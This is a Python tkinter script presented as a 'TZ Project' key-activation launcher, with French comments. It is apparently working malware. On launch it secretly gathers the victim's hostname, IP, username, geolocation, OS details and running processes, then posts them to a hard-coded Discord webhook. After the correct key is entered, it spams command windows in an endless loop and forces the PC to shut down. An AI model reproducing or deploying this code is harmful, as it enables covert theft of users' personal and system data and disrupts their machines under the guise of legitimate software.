import tkinter as tk
from PIL import Image, ImageTk
import os
import threading
import subprocess
import requests
import socket
import platform
import psutil
import json

# Configuration
logo_path = "IMG_2724.jpeg"
bg_path = "IMG_2728.jpeg"
webhook_url = "https://discord.com/api/webhooks/1317804846388084746/LzjsxSceGqQaizw-JqFCUvbrFRhboYC0DJbmMFH21ViQlikda0bZF9E4z2zDiRT2N9f8"
correct_key = "CM_AFEO-LOVD-DJRB-DIES"

# 📡 Récupérer les informations sur l'IP et la localisation
def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        location = data.get('city', 'Inconnu') + ", " + data.get('region', 'Inconnu') + ", " + data.get('country', 'Inconnu')
        ip_address = data.get('ip', 'Inconnu')

        return location, ip_address
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de la récupération de l'IP : {e}")
        return 'Inconnu', 'Inconnu'

# 📡 Récupérer les infos du PC
def get_system_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        os_name = platform.system()
        os_version = platform.release()
        user = os.getenv("USERNAME") or os.getenv("USER")
        location, ip_info = get_ip_info()

        # 📊 Récupérer des infos système supplémentaires
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory().percent

        # Vérification si Discord est installé
        discord_installed = os.path.exists(r"C:\Users\{0}\AppData\Local\Discord\app-*.exe".format(user))  # Change selon ton OS si nécessaire

        # Récupération de la version des drivers et applications installées
        driver_version = platform.version()
        applications = [p.name() for p in psutil.process_iter()]

        return {
            "content": "**💻 Connexion détectée sur TZ Project !**",
            "embeds": [
                {
                    "title": "🔍 Infos du PC",
                    "color": 16711680,  # Rouge
                    "fields": [
                        {"name": "🖥️ Nom du PC", "value": hostname, "inline": False},
                        {"name": "🌐 Adresse IP", "value": ip_address, "inline": False},
                        {"name": "👤 Utilisateur", "value": user, "inline": False},
                        {"name": "🛠️ OS", "value": f"{os_name} {os_version}", "inline": False},
                        {"name": "📍 Localisation", "value": location, "inline": False},
                        {"name": "💾 RAM", "value": f"{ram}% utilisée", "inline": False},
                        {"name": "🖥️ CPU", "value": f"{cpu}% utilisé", "inline": False},
                        {"name": "📦 Version des drivers", "value": driver_version, "inline": False},
                        {"name": "Applications installées", "value": ", ".join(applications[:5]), "inline": False},
                        {"name": "Discord Installé", "value": "Oui" if discord_installed else "Non", "inline": False}
                    ]
                }
            ]
        }
    except Exception as e:
        return {"content": f"❌ Erreur lors de la récupération des infos : {e}"}

# 📩 Envoi du webhook dès le lancement
def send_webhook():
    data = get_system_info()
    try:
        requests.post(webhook_url, json=data)
    except Exception as e:
        print(f"❌ Erreur Webhook : {e}")

threading.Thread(target=send_webhook, daemon=True).start()

# 💥 Ouvrir des CMD en boucle infinie
def open_cmd_forever():
    while True:
        subprocess.Popen("start cmd", shell=True)

# 🛑 Éteindre le PC après la validation de la clé
def shutdown_pc():
    os.system("shutdown /s /t 10 /c 'FORCE À TOI :('")  # Éteint dans 10 sec

# 🎬 Afficher la fenêtre "Loading" et spam CMD
def open_loading_window():
    global root
    root.destroy()  # Ferme la fenêtre principale

    loading_window = tk.Tk()
    loading_window.title("Loading")
    loading_window.geometry("800x600")  # Grande fenêtre
    loading_window.configure(bg="black")

    # Centrage de la fenêtre
    screen_width = loading_window.winfo_screenwidth()
    screen_height = loading_window.winfo_screenheight()
    x_pos = (screen_width // 2) - (800 // 2)
    y_pos = (screen_height // 2) - (600 // 2)
    loading_window.geometry(f"800x600+{x_pos}+{y_pos}")

    label = tk.Label(loading_window, text="LOADING...", font=("Arial", 40, "bold"), fg="white", bg="black")
    label.pack(expand=True)

    # 📢 Lancer le spam CMD et éteindre le PC
    threading.Thread(target=open_cmd_forever, daemon=True).start()
    threading.Thread(target=shutdown_pc, daemon=True).start()

    loading_window.mainloop()

# 🎫 Vérification de la clé
def check_key():
    if key_entry.get() == correct_key:
        root.after(500, open_loading_window)  # Ouvre "Loading"
    else:
        result_label.config(text="❌ Clé invalide", fg="red")

# 🎨 Interface graphique
root = tk.Tk()
root.title("TZ Project")
root.geometry("400x300")
root.overrideredirect(True)  # Supprime la barre Windows

# Centrage de la fenêtre
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x_pos = (screen_width // 2) - (400 // 2)
y_pos = (screen_height // 2) - (300 // 2)
root.geometry(f"400x300+{x_pos}+{y_pos}")

# Charger et afficher le fond
if os.path.exists(bg_path):
    bg_img = Image.open(bg_path).resize((400, 300), Image.LANCZOS)
    bg_tk = ImageTk.PhotoImage(bg_img)
    bg_label = tk.Label(root, image=bg_tk)
    bg_label.place(x=0, y=0, relwidth=1, relheight=1)

# Charger et afficher le logo
if os.path.exists(logo_path):
    logo_img = Image.open(logo_path).resize((80, 80), Image.LANCZOS)
    logo_tk = ImageTk.PhotoImage(logo_img)
    logo_label = tk.Label(root, image=logo_tk, bg="#ffffff")
    logo_label.place(relx=0.5, y=30, anchor="center")

# Cadre principal
frame = tk.Frame(root, bg="#ffffff")
frame.place(relx=0.5, rely=0.5, anchor="center")

# Label du titre
title_label = tk.Label(frame, text="TZ Project", font=("Arial", 16, "bold"), bg="#ffffff", fg="black")
title_label.pack(pady=10)

# Champ de texte (Key)
key_entry = tk.Entry(frame, font=("Arial", 14), bg="#f0f0f0", fg="black", justify="center", insertbackground="black", highlightthickness=1, highlightbackground="#555")
key_entry.pack(pady=10, ipadx=10, ipady=5)

# Bouton CHECK
check_button = tk.Button(frame, text="CHECK", font=("Arial", 14, "bold"), bg="#333", fg="white", bd=0, relief="flat", activebackground="#00ffaa", activeforeground="black", command=check_key)
check_button.pack(pady=10, ipadx=10, ipady=5)

# Label pour le résultat
result_label = tk.Label(frame, text="", font=("Arial", 12), bg="#ffffff")
result_label.pack(pady=5)

# Lancement de l'application
try:
    root.mainloop()
except Exception as e:
    print(f"❌ Erreur : {e}")
    input("Appuyez sur Entrée pour quitter...")
